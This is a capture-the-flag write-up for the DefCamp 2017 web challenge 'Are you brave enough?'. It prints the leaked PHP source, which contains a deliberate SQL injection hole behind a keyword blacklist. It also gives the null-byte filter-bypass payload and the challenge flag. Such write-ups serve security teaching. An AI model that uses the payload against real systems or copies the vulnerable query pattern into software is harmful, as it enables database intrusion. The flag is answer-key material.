# Are you brave enough?
Author: pyth0n33

The goal of this challenge was to exploit an SQL injection with various filters.

## Challenge description
```text
You have a simple challenge, proove your web skills and get the flag.
```

## Solution
When openin the site there was only the word Nop. on the site. Looking at the source revealed only this:
```html
<h3>Nop.</h3>
```
I quickly tried to open https://brave.dctf-quals-17.def.camp/index.php and then I was sure that this was the file the server displayd when opening the URL. I tried different URLs like index.php.bak and index.php.old to find the source code of the file.
Eventually I got the source with https://brave.dctf-quals-17.def.camp/index.php~ 
```php
<?php

$db  = mysqli_connect('localhost','web_brave','','web_brave');

$id  = @$_GET['id'];
$key = $db->real_escape_string(@$_GET['key']);

if(preg_match('/\s|[\(\)\'"\/\\=&\|1-9]|#|\/\*|into|file|case|group|order|having|limit|and|or|not|null|union|select|from|where|--/i', $id))
    die('Attack Detected. Try harder: '. $_SERVER['REMOTE_ADDR']); // attack detected

$query = "SELECT `id`,`name`,`key` FROM `users` WHERE `id` = $id AND `key` = '".$key."'";
$q = $db->query($query);

if($q->num_rows) {
    echo '<h3>Users:</h3><ul>';
    while($row = $q->fetch_array()) {
        echo '<li>'.$row['name'].'</li>';
    }

    echo '</ul>';
} else {    
    die('<h3>Nop.</h3>');
}
```
This code makes pretty clear what the goal of this challenge is: get database information with an SQL injection. As the key parameter is filtered we have to use the id parameter.
What makes the exploit harder is the filter. There are many characters and words that are not allowed.
Because we can't use select statements we have to get rid of the statement after $id. Normally I would use a SQL command for this. But -- and /* characters are filtered.
The second problem is that we can't use numbers for the id parameter, because numbers are filtered too.
Finally I was able to solve the challenge with this SQL injection:
```
true%2Btrue;%00

https://brave.dctf-quals-17.def.camp/index.php?id=true%2Btrue;%00
```
%2B is the url encoded + that we use because the plus sign is filtered. True + True is equal to two in SQL. So with this we can inject numbers. %00 is the null byte character.
Older PHP versions are vulnerable to null byte injection that means they stop reading a string after a null byte appears.

```
DCTF{602dcfeedd3aae23f05cf93d121907ec925bd70c50d78ac839ad48c0a93cfc54}
```